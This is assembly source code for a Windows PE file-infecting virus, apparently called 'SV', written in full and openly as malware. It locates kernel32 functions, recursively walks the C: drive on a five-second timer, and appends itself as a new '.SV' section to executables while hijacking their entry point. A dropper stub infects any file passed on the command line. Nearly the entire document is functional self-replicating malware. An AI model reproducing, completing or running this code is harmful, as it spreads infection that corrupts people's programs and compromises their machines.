   .386
   .locals
   .jumps
   .model flat,STDCALL
   L       equ     <LARGE>
   VirusSize =     (offset VirusEnd-offset VirusBegin)
   PlusSize =      (offset PlusEnd-offset VirusEnd)
   wfdSize =       (size WIN32_FIND_DATA)

   include win32.inc
   include defs.inc

   Pile            Segment stack use32
           db      1000h dup (?)
   Pile            ends

   PCode           Segment use32
           assume  cs:PCode, ds:PCode, ss:Pile

   VirusBegin:

   KrnlImport      PLoadLib, 'LoadLibraryA'
   KrnlImport      PGetProcAdr, 'GetProcAddress'

   KrnlImport      SFFFile, 'FindFirstFileA'
   KrnlImport      SFNFile, 'FindNextFileA'
   KrnlImport      SFCFile, 'FindClose'
   KrnlImport      SCreateFile, 'CreateFileA'
   KrnlImport      SFSize, 'GetFileSize'
   KrnlImport      SFSeek, 'SetFilePointer'
   KrnlImport      SReadFile, 'ReadFile'
   KrnlImport      SWriteFile, 'WriteFile'
   KrnlImport      SCloseHndl, 'CloseHandle'
   KrnlImport      SMAlloc, 'GlobalAlloc'
   KrnlImport      SMFree, 'GlobalFree'
   KrnlImport      SExit, 'ExitProcess'

   Library         User32, 'user32.dll'

   Import  SMsgBox, User32, 'MessageBoxA'
   Import  SSetTimer, User32, 'SetTimer'
   Import  SKillTimer, User32, 'KillTimer'

   FutureEIP       dd      offset Start
   ;this will be the section i'll write in infected files
   SectionHdr      db      '.SV'
                   db      5 dup (0)       ;Name of section
   SRSize          dd      0               ;Size in RAM
   SRVA            dd      ?               ;Where it will be loaded in RAM
   SFlSize         dd      ?               ;size in file
   SFlOff          dd      ?               ;where in file
                   dd      3 dup (0)       ;some unneeded stuff
                   dd      0f0000060h      ;some flags...

   NxtPart         dd      0               ;For Part merging {
   SzPart          dd      ?               ; }

   ;only for testing
   LogName         db      'c:\sv.log', 0
   LogHndl         dd      ?
   CRLF            db      13, 10

   InfectStr       db      'Infect...', 0
   SubDirStr       db      '=>', 0
   LogDirStr       db      '..', 0

   VStart: ;At start, eax = eip, then eax = real offset of VStart
           sub     eax,offset VStart
           mov     [offset sEBX+eax],ebx
           mov     [offset sECX+eax],ecx
           mov     [offset sEDX+eax],edx
           mov     [offset sEDI+eax],edi
           mov     [offset sESI+eax],esi
           mov     [offset sEBP+eax],ebp

           mov     edx,[esp]
           call    GetKrnlBase

           mov     edi,eax

           DoKrnlImport    PLoadLib
           DoKrnlImport    PGetProcAdr

           DoKrnlImport    SFFFile
           DoKrnlImport    SFNFile
           DoKrnlImport    SFCFile
           DoKrnlImport    SCreateFile
           DoKrnlImport    SFSize
           DoKrnlImport    SFSeek
           DoKrnlImport    SReadFile
           DoKrnlImport    SWriteFile
           DoKrnlImport    SCloseHndl
           DoKrnlImport    SMAlloc
           DoKrnlImport    SMFree
           DoKrnlImport    SExit

           LoadLibrary     User32
           DoImport SMsgBox
           DoImport SSetTimer
           DoImport SKillTimer

           push    dword ptr [offset FutureEIP+edi]        ;for the 'ret' at the end

           push    L 0
           push    L 0
           push    L CREATE_ALWAYS
           push    L 0
           push    L 0
           push    L GENERIC_READ+GENERIC_WRITE
           lea     eax,[offset LogName+edi]
           push    eax
           CallImp SCreateFile
           mov     [offset LogHndl+edi],eax

           lea     eax,[offset wfd+edi]
           push    eax
           lea     eax,[offset DriveIndx+edi]
           push    eax
           CallImp SFFFile
           mov     FndHndl[edi],eax

           lea     eax,[offset TimerProc+edi]
           push    eax
           push    L 5000                  ;all 5 seconds
           push    L 0
           push    L 0
           CallImp SSetTimer
           mov     [offset TimerHndl+edi], eax

   RetHost:push    dword ptr [offset sEDI+edi]
           mov     eax,[esp+4]
           mov     ebx,[offset sEBX+edi]
           mov     ecx,[offset sECX+edi]
           mov     edx,[offset sEDX+edi]
           mov     esi,[offset sESI+edi]
           mov     ebp,[offset sEBP+edi]
           pop     edi
           ret                                     ;to FutureEIP

   GetKrnlImport   proc
   ;parm: edx = kernel base
   ;      esi = fct struct ( dd ptr, db[] name, 0 )
           push    ebp
           mov     ebp,edi                         ;That's the only reg we don't
                                                   ;use here...

           push    esi                             ;Save it!
           mov     ebx,edx                         ;ebx=MZ PTR
           add     ebx,[ebx+3ch]                   ;ebx=PE PTR
           mov     ebx,[ebx+78h]                   ;ebx=Export tables RVA
           add     ebx,edx                         ;ebx=Export tables PTR

           mov     edi,[ebx+20h]                   ;edi=Names table RVA
           lea     edi,[edi+edx-4]                 ;edi=Names table PTR - 4
                                                   ; cuz + 4 after
           mov     [offset Save1+ebp],edi
           lea     esi,[esi+4]                     ;esi=PTR to name to look
           mov     [offset Save2+ebp], esi
   ESLoop:
           mov     edi,[offset Save1+ebp]
           mov     esi,[offset Save2+ebp]
           add     edi,4
           mov     [offset Save1+ebp],edi
           mov     edi,[edi]
           add     edi,edx
   ESStrLoop:
           lodsb
           cmp     al,[edi]
           jnz     ESLoop                          ;Not equal, then next
           inc     edi
           or      al,al
           jz      ESFound                         ;0=end of string
           jmp     ESStrLoop
   ESFound:
           mov     edi,[offset Save1+ebp]          ;edi=PTR -> fct name
           sub     edi,[ebx+20h]                   ;edi=Fct# * 4 + Kernel
           sub     edi, edx                        ;edi=Fct# * 4

           mov     eax,[ebx+1ch]                   ;eax=RVA -> export table
           lea     eax,[edx+eax]                   ;eax=PTR -> export table

           mov     ecx,[ebx+14h]
           sub     ecx,[ebx+18h]
           lea     eax,[eax+4*ecx]                 ;eax=RVA -> named fcts
           mov     eax,[eax+edi]                   ;eax=RVA -> fct

           add     eax,edx                         ;eax=PTR -> fct
           pop     esi                             ;Restore it!
           mov     [esi],eax

           mov     edi,ebp
           pop     ebp
           ret
   GetKrnlImport   endp

   GetImport       proc
   ;parm: esi = fct struct ( dd ptr, dd HInst ptr, db[] name )
           lea     eax,[esi+8]
           push    eax
           mov     eax,[esi+4]
           push    dword ptr [eax+edi]
           CallImp PGetProcAdr
           mov     [esi],eax
           ret
   GetImport       endp

   InfectFileA     proc
   ;parms: esi = FileName
   ;return: CF = 0 : ok, 1 : Nope!

           push    L 0
           push    L 0
           push    L OPEN_EXISTING
           push    L 0
           push    L 0
           push    L GENERIC_READ+GENERIC_WRITE
           push    esi
           CallImp SCreateFile
           cmp     eax,-1
           jz      ErrRet                  ;not opened
           mov     [offset FHndl+edi], eax

           push    L 0                     ;but we need only the low dword
                                                   ;( this PTR->High dword )
           push    dword ptr [offset FHndl+edi] ;of FHndl
           CallImp SFSize                  ;get file size

           mov     [offset SFlOff+edi], eax

           add     eax,1000h               ;Plus some other bytes for me
           push    eax                     ;file size bytes++
           push    L GMEM_FIXED            ;so that it don't move ;)
           CallImp SMAlloc                 ;allocate global memory
           mov     esi,eax                 ;esi=PTR -> our memory

           or      eax,eax
           jz      ErrRetA                 ;not enough memory!

           push    L 0

           lea     eax,[offset Buffer+edi]
           push    eax                     ;here will be number of bytes
                                                   ;"well-readed"
           mov     eax, [offset SFlOff+edi]
           push    eax                     ;file size
           push    esi                     ;there!
           push    dword ptr [offset FHndl+edi] ;and from there...
           CallImp SReadFile               ;now, put raw file in memory
                                                   ;note: always work...
           cmp     word ptr [esi],'ZM'
           jnz     ErrRetB
           or      edi,edi
   ;Now that the file is mapped, we can begin... 1st: let look for the
   ;entry point RVA, that will come in 'FutureEIP'
           mov     eax,[esi+3ch]           ;PE offset in file, like a RVA
           cmp     eax,[offset SFlOff+edi] ;Dos EXE have some nasty values...
           jnb     ErrRetB
           add     eax,esi                 ;esi=PTR -> PE
           cmp     word ptr [eax],'EP'
           jnz     ErrRetB
           mov     edx,[eax+28h]           ;Prog entry point (RVA)
           add     edx,[eax+34h]           ;Plus base
           mov     dword ptr [offset FutureEIP+edi],edx
   ;Now, we have to put our section...
   ;We have to know where to put the section header in the file
   ;(if we have enough room), and where we could put it in memory
           movzx   ecx,word ptr [eax+6]    ;number of sections
           movzx   ebx,word ptr [eax+14h]  ;size of optional header
                                                   ;it come at offset 18 in
                                                   ;the header
           cmp     ebx,0d0h                ;What info we need...
           jb      ErrRetB

           mov     edx,ebx
           mov     ebx,[eax+0a4h]          ;Size of relocation datas
           mov     [offset RelSz+edi],ebx  ;Save it!
           mov     ebx,[eax+0a0h]          ;RVA of relocation datas
           mov     [offset RelRVA+edi],ebx ;Save it!

           lea     ebx,[edx+eax+18h]       ;ebx=1st section header
           mov     dword ptr [offset SRVA+edi],0
           mov     dword ptr [offset Save1+edi],-1 ;unsigned=>maxxxxx.....
   SLLoop:
           mov     edx,[ebx+0ch]           ;RVA of section
           ;|SctRVA=edx|   |RelRVA|    |SctRVA+SctSz|
           sub     edx,[offset RelRVA+edi]
           jg      NotReloc2               ;|RelRVA|     |SctRVA| |SctRVA+SctSz|
           neg     edx                     ;|SctRVA| EDX |RelRVA| |SctRVA+SctSz|
           cmp     edx,[ebx+08h]           ;cmp edx,SctSz
           jg      NotReloc1
           add     edx,[ebx+14h]           ;Where section is in file
           mov     [offset RelFle+edi],edx ;Save where Relocations are in file
           sub     edx,[ebx+14h]           ;restore edx
   NotReloc1:
           neg     edx                     ;restore edx
   NotReloc2:
           add     edx,[offset RelRVA+edi] ;restore edx
           add     edx,[ebx+08h]           ;size of section
           cmp     edx,[offset SRVA+edi]
           jb      NotAfterRam
           mov     [offset SRVA+edi],edx
   NotAfterRam:
           mov     edx,[ebx+14h]           ;Where section is in file
           jz      NotBeforeFle            ;if 0 => not in file/initialised
           cmp     edx,[offset Save1+edi]
           ja      NotBeforeFle
           mov     [offset Save1+edi],edx
   NotBeforeFle:
           add     ebx,28h                 ;28h=size of section header
           loop    SLLoop

           sub     ebx,esi                 ;ebx=RVA of after section headers
           add     ebx,28h                 ;28h=size of section header
           cmp     ebx,[offset Save1+edi]
           ja      ErrRetB                 ;not enough room for my header :(((
           add     ebx,esi
           sub     ebx,50h
   ;Perhaps is that file already infected...
           cmp     dword ptr [ebx], 0056532Eh ; '.SV', 0
           jz      OkRet                   ;Already infected
           add     ebx,28h                 ;28h=size of section header

   ;We have to calculate the size of section and in the infected file
   ;with the file alignement and his size in the ram...
           push    ebx                     ;Do not exchange this 2 push, cuz we
           push    eax                     ;will get this w/ [esp]
           mov     ebx,[eax+3ch]           ;file alignement
           mov     eax,VirusSize
           xor     edx,edx
           div     ebx
           or      edx,edx
           jz      KeepSFlSize
           inc     eax
   KeepSFlSize:
           mul     ebx
           mov     [offset SFlSize+edi],eax

           mov     eax,[offset SFlOff+edi]
           div     ebx
           or      edx,edx
           jz      KeepSFlOff
           inc     eax
           mul     ebx
           mov     [offset SFlOff+edi], eax
   KeepSFlOff:

           mov     eax,PlusSize+VirusSize
           mov     ebx,[esp]
           mov     ebx,[ebx+3ch]           ;Alignement
           div     ebx
           or      edx,edx
           jz      KeepSRSize
           inc     eax
           mul     ebx
           mov     [offset SRSize+edi], eax
   KeepSRSize:

           mov     eax,[offset SRVA+edi]
           div     ebx
           or      edx,edx
           jz      KeepSRVA
           inc     eax
           mul     ebx
           mov     [offset SRVA+edi], eax
   KeepSRVA:

           pop     eax
           pop     ebx

   ;;Set properly some internals variables
   ;        mov     edx,[offset SRVA+edi]
   ;        add     [offset FutureEIP+edi],edx
   ;Copy section header in the file
           xchg    esi,edx
           xchg    edi,ebx
           lea     esi,[offset SectionHdr+ebx]
           mov     ecx,10
           rep     movsd
   ;Copy me at end of file
           lea     esi,[offset VirusBegin+ebx]
           mov     edi,[offset SFlOff+ebx]
           add     edi,edx
           mov     ecx,(VirusSize/4)+1
           rep     movsd

           xchg    edi,ebx
           xchg    esi,edx

   ;Ok, now, just inc the number of sections!
           inc     word ptr [eax+6]                ;easy!

   ;Now, let's change the entry point...
           mov     edx,[offset SRVA+edi]
           add     edx,offset VStart-offset VirusBegin
           mov     [eax+28h],edx

   ;Well... just save our work...
           push    L FILE_BEGIN
           lea     eax,[offset Buffer+edi]
           mov     dword ptr [eax],0
           push    L eax
           push    L 0
           push    dword ptr [offset FHndl+edi]
           CallImp SFSeek

           push    L 0                     ;overlapped?
           lea     eax,[offset Buffer+edi]
           push    eax                     ;here will be number of bytes written
           mov     eax,[offset SFlOff+edi]
           add     eax,[offset SFlSize+edi]
           push    eax                     ;file size
           push    esi                     ;from there...
           push    dword ptr [offset FHndl+edi] ;and there!
           CallImp SWriteFile               ;hehemuahahahah    AHAHA!

           push    esi
           CallImp SMFree                  ;free that unneeded mem

           push    dword ptr [offset FHndl+edi]
           CallImp SCloseHndl              ;Ok

           jmp     OkRet

   ErrRetB:push    esi
           CallImp SMFree
   ErrRetA:push    dword ptr [offset FHndl+edi]
           CallImp SCloseHndl
   ErrRet: stc
           jmp     IFARet
   OkRet:  clc
   IFARet: ret
   InfectFileA     endp

   TimerProc       proc uses ebx edi esi, hWnd:DWORD, uMsg:DWORD, idEvent:DWORD, dwTime:DWORD
   ;Thus is called each second and try to infect the next file
           call    SReloc
   SReloc: pop     edi
           sub     edi,offset SReloc

           mov     dword ptr [offset Buffer+edi],2 ;1 iteration = 2 try
           lea     edx,[offset wfd+edi]
   TimerStart:
           mov     eax,[edx]                       ;File attribute
           test    eax,FILE_ATTRIBUTE_DIRECTORY
           jnz     TPUpDir
           test    eax,FILE_ATTRIBUTE_COMPRESSED
           jnz     TPNextFile

           call    ConcatPath
           lea     esi,[offset DriveIndx+edi]
           call    AddLog

   ;        push    L MB_OK
   ;        lea     eax,[offset InfectStr+edi]
   ;        push    eax
   ;        push    esi
   ;        push    L 0
   ;        CallID  SMsgBox

           push    edx
           call    InfectFileA
           pop     edx
           dec     dword ptr [offset Buffer+edi]


   TPNextFile:
           mov     ecx,[offset FndHndlIndx+edi]
           push    edx
           push    FndHndl[edi+4*ecx]
           CallID  SFNFile
           or      eax,eax
           jnz     TPRet                           ;Found => not down_dir
   TPDownDir:
           mov     ecx,[offset FndHndlIndx+edi]
           push    FndHndl[edi+4*ecx]
           CallICD SFCFile

           dec     ecx
           jz      TPNextDrive
           mov     [offset FndHndlIndx+edi],ecx
           lea     esi,[offset LogDirStr+edi]
           call    AddLog

           mov     ebx,edi

           lea     edi,[offset PathName+ebx]
           mov     ecx,-1
           xor     al,al
           repnz   scasb
           std
           mov     al,'\'
           repnz   scasb
           repnz   scasb
           inc     edi
           cld

           mov     eax,'*.*\'
           stosd
           xor     al,al
           stosb
           mov     edi,ebx

           jmp     TPNextFile
   TPUpDir:
           lea     esi,[edx+44]                    ;File name
           cmp     byte ptr [esi], '.'             ;for "." and ".."
           je      TPNextFile

           mov     ecx,[offset FndHndlIndx+edi]
           inc     ecx
           mov     [offset FndHndlIndx+edi],ecx

           call    ConcatPath
           mov     dword ptr [ebx],'*.*\'          ;"\*.*"for those who don't
           mov     byte ptr [ebx+4],0

           lea     esi,[offset DriveIndx+edi]
           call    AddLog
   ;        push    L MB_OK
   ;        lea     eax,[offset SubDirStr+edi]
   ;        push    eax
   ;        lea     eax,[offset DriveIndx+edi]
   ;        push    eax
   ;        push    L 0
   ;        CallID  SMsgBox

           push    edx
           lea     eax,[offset DriveIndx+edi]
           push    eax
           CallID  SFFFile
           cmp     eax,-1
           je      TPDownDir
           mov     ecx,[offset FndHndlIndx+edi]
           mov     FndHndl[edi+4*ecx],eax
           jmp     TPRet
   TPNextDrive:
   ;Here, it would be next drive ( c: -> d: -> ... ), but not yet found...
   ;i just kill my timer
   ;        mov     dword ptr [offset FndHndlIndx+edi],0
   ;        mov     PathName[edi],0
   ;        push    edx
   ;        lea     eax,[offset DriveIndx+edi]
   ;        push    eax
   ;        CallID  SFFFile
   ;        mov     FndHndl[edi],eax
           push    dword ptr [offset TimerHndl+edi]
           push    L 0
           CallImp SKillTimer
           jmp     TPEnd
   TPRet:  mov     ecx,[offset Buffer+edi]
           or      ecx,ecx
           jnz     TimerStart
   TPEnd:  ret
   TimerProc       endp

   ConcatPath      proc
   ; parm: -
   ; ret: [ebx] = 0 of end of string
           mov     ebx,edi

           lea     edx,[offset wfd+edi]
           lea     esi,[edx+44+MAX_PATH]                   ;8.3 name
           cmp     byte ptr [esi],0
           jnz     CPNamed
           sub     esi,MAX_PATH                            ;8.3 name = real name
   CPNamed:lea     edi,[offset PathName+ebx]
           mov     ecx,-1
           xor     al,al
           repnz   scasb
           std
           dec     edi
           mov     al,'\'
           repnz   scasb
           inc     edi
           cld

           inc     edi

   CPBcl:  lodsb
           or      al,al
           jz      CPFBcl
           stosb
           jmp     CPBcl
   CPFBcl: xor     al,al
           stosb
           dec     edi
           xchg    edi,ebx

           ret
   ConcatPath      endp

   AddLog          proc
           call    StrLen

           push    L 0                     ;overlapped?
           lea     eax,[offset Save2+edi]
           push    eax                     ;here will be number of bytes written
           push    ecx
           push    esi                     ;from there...
           push    dword ptr [offset LogHndl+edi] ;and there!
           CallID  SWriteFile

           push    L 0                     ;overlapped?
           lea     eax,[offset Save2+edi]
           push    eax                     ;here will be number of bytes written
           push    L 2
           lea     eax,[offset CRLF+edi]
           push    eax
           push    dword ptr [offset LogHndl+edi] ;and there!
           CallID  SWriteFile

           ret
   AddLog          endp

   StrLen          proc
           mov     ecx,-1
           mov     ebx,edi
           mov     edi,esi
           xor     al,al
           repnz   scasb
           not     ecx
           mov     edi,ebx
           ret
   StrLen          endp

   GetKrnlBase     proc
   ;parm: edx = begin [esp]
   ;ret: edx = kernel base
   KrnlSrch:
           dec     edx
           cmp     edx,[edx+0b4h]
           jnz     GetKrnlBase
           ret
   GetKrnlBase     endp

   FndHndlIndx     dd      0

   NDrives         db      1
   DriveIndx       db      'c'
                   db      ':\'
   PathName        db      '*.*', MAX_PATH-6 dup (0)       ;6="c:\*.*"

   VirusEnd:

   TimerHndl       dd      ?

   sEBX            dd      ?
   sECX            dd      ?
   sEDX            dd      ?
   sEDI            dd      ?
   sESI            dd      ?
   sEBP            dd      ?
   Buffer          dd      ?

   FHndl           dd      ?

   wfd             WIN32_FIND_DATA <?>
   FndHndl         dd      64 dup (?)      ;Max 64 subdirs (c:\1\2\3\4\...\64)

   Save1   dd      ?
   Save2   dd      ?
   RelSz   dd      ?
   RelRVA  dd      ?
   RelFle  dd      ?

   PlusEnd:

   KrnlImport      SGetCmdLine, 'GetCommandLineA'
   SVStr           db      'SV filename.exe', 0
   CmdLnStr        db      'You have to drag a file to the infector EXE or to specify the name of the file to infect with the command line.', 0
   OkStr           db      'File successfuly infected.', 0
   BadStr          db      'The file cannot be infected!', 0

   Start:  mov     edx,[esp]
           call    GetKrnlBase
           xor     edi,edi
           DoKrnlImport    PLoadLib
           DoKrnlImport    PGetProcAdr
           DoKrnlImport    SGetCmdLine
           DoKrnlImport    SCreateFile
           DoKrnlImport    SFSize
           DoKrnlImport    SFSeek
           DoKrnlImport    SReadFile
           DoKrnlImport    SWriteFile
           DoKrnlImport    SCloseHndl
           DoKrnlImport    SMAlloc
           DoKrnlImport    SMFree
           DoKrnlImport    SExit
           LoadLibrary     User32
           DoImport SMsgBox
           CallImp SGetCmdLine
           mov     edi,eax
           mov     ecx,-1
           inc     edi
           mov     al,'"'
           repnz   scasb
           mov     al,' '
           repz    scasb
           lea     esi,[edi-1]
           mov     Save2,esi
           xor     edi,edi
           cmp     byte ptr [esi],0
           jz      SVNoCL
           call    InfectFileA
           jc      SVNoInf
           push    L MB_OK+MB_ICONINFORMATION
           push    offset OkStr
           push    Save2
           jmp     SVMsgBx
   SVNoInf:
           push    L MB_OK+MB_ICONERROR
           push    offset BadStr
           push    Save2
           jmp     SVMsgBx
   SVNoCL:
           push    L MB_OK+MB_ICONWARNING
           push    offset SVStr
           push    offset CmdLnStr
   SVMsgBx:push    L 0
           CallImp SMsgBox
           push    L 0
           call    dword ptr [SExit]
   PCode           ends
           end Start
